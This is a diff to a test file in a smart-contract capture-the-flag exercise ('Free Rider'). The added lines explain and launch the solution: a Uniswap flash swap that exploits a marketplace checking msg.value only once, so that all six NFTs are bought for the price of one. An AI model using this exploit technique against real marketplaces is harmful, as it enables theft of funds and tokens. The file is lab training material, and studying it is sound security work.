@@ -106,6 +106,14 @@ describe('[Challenge] Free Rider', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        // The marketplace in the buy function only checks the msg.value once in the buyOne function without updating it, this way it is only necessary
+        // to use 15 of ether to get all the NFTs. To get that ether we request a flash loan of weth in uniswap, convert it to ether, use it to buy
+        // the six tokens and send them to the recovery contract. When this contract receives all of them it sends us 45 of ether that we use to pay
+        // the loan on uniswap
+        let freeRiderLoan = await (await ethers.getContractFactory('FreeRiderLoan', player)).deploy(uniswapFactory.address, weth.address, token.address, marketplace.address, devsContract.address, nft.address, uniswapPair.address);
+
+        await freeRiderLoan.flashSwap(NFT_PRICE);
+
     });
 
     after(async function () {
